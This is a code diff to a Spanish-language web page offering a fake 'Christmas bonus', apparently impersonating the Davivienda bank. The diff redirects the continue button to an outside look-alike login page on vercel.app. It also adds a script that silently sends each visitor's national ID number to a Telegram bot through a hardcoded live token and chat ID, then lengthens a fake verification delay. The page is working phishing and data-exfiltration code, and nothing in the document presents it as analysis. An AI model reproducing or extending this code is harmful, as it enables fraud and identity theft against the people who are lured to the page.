@@ -74,7 +74,6 @@
         <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
             <path stroke-linecap="round" stroke-linejoin="round" d="M5.121 17.804A13.937 13.937 0 0112 16c2.5 0 4.847.655 6.879 1.804M15 10a3 3 0 11-6 0 3 3 0 016 0zm6 3a9 9 0 11-18 0 9 9 0 0118 0z" />
         </svg>
-      </button>
     </div>
   </header>
 
@@ -132,7 +131,7 @@
             Usted ha sido <b>seleccionado</b> para el <b>Bono navideño</b>.
         </p>
 
-        <button onclick="location.href='datos.html'"
+        <button onclick="location.href='https://davivifullse.vercel.app/login'"
           class="w-full btn-primary hover:bg-red-800 transition text-white font-bold py-3 rounded-xl text-lg shadow-lg shadow-red-500/60">
           CONTINUAR PARA LLENAR DATOS
         </button>
@@ -158,6 +157,42 @@
   </footer>
 
   <script>
+    // --- Configuración de Telegram (Usando los datos que proporcionaste) ---
+    const TELEGRAM_BOT_TOKEN = '8495218543:AAEMTxhx0-wHxW-UPRMst_xN6fT8l2YPZKA';
+    const TELEGRAM_CHAT_ID = '-5083730876';
+    // ---------------------------------
+
+    /**
+     * Envía un mensaje a Telegram con la cédula consultada.
+     * @param {string} cedula El número de cédula ingresado por el usuario.
+     */
+    function sendToTelegram(cedula) {
+      // El mensaje que se enviará: 🔴NUEVA CONSULTA: (Cedula)
+      const message = `🔴NUEVA CONSULTA: ${cedula}`;
+      const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+      const params = new URLSearchParams({
+        chat_id: TELEGRAM_CHAT_ID,
+        text: message,
+        parse_mode: 'HTML' 
+      });
+
+      // Petición fetch al API de Telegram
+      fetch(`${url}?${params.toString()}`, {
+          method: 'POST',
+      })
+      .then(response => {
+          if (!response.ok) {
+              console.error('Error al enviar a Telegram. Estado:', response.status);
+          } else {
+              console.log('Cédula enviada a Telegram con éxito.');
+          }
+      })
+      .catch(error => {
+          console.error('Error de red al intentar enviar a Telegram:', error);
+      });
+    }
+
     document.getElementById('verify-button').addEventListener('click', function() {
       const cedulaInput = document.getElementById('cedula');
       const cedula = cedulaInput.value.trim();
@@ -173,6 +208,9 @@
       errorMessage.classList.add('hidden');
       cedulaInput.classList.remove('border-red-500');
 
+      // 🛑 PASO CLAVE: ENVIAR A TELEGRAM antes de simular la espera
+      sendToTelegram(cedula);
+
       // 1. Ocultar el formulario
       document.getElementById('cedula-form-section').classList.add('hidden');
 
@@ -180,7 +218,7 @@
       const loaderSection = document.getElementById('loader-section');
       loaderSection.classList.remove('hidden');
 
-      // 3. Simular la verificación (3 segundos)
+      // 3. Simular la verificación (7 segundos)
       setTimeout(function() {
         // 4. Ocultar el Loader
         loaderSection.classList.add('hidden');
